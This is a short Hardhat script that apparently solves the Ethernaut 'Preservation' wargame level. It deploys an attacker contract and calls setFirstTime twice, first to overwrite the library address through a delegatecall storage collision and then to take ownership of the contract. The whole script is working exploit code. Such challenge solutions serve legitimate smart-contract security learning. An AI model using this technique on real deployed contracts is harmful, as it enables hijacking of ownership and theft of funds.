const { getNamedAccounts, ethers } = require("hardhat")

const preservationInstanceAddress = "0xc57346BfA1df2f4BcbaB03F2fdC66e78d5DA2DC2"

async function main() {
  const { deployer } = await getNamedAccounts()

  console.log("Connecting to your instance of Preservation contract...")
  const preservation = await ethers.getContractAt(
    "Preservation",
    preservationInstanceAddress,
    deployer
  )

  console.log("Deploying attacker contract...")
  await deployments.fixture("preservation")
  const attacker = await ethers.getContract("PreservationAttacker", deployer)

  console.log("This will set attacker contract as timeZone1Library:")
  console.log("Calling setFirstTime() with attacker contrat address...")
  const setFirstTime = await preservation.setFirstTime(attacker.address)
  await setFirstTime.wait(1)

  console.log("Claiming ownership by calling setFirstTime again...")
  const attackerFirstTime = await preservation.setFirstTime(attacker.address)
  await attackerFirstTime.wait(1)

  console.log("Pwned!")
}

// Call th main function and log errors if any occur
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
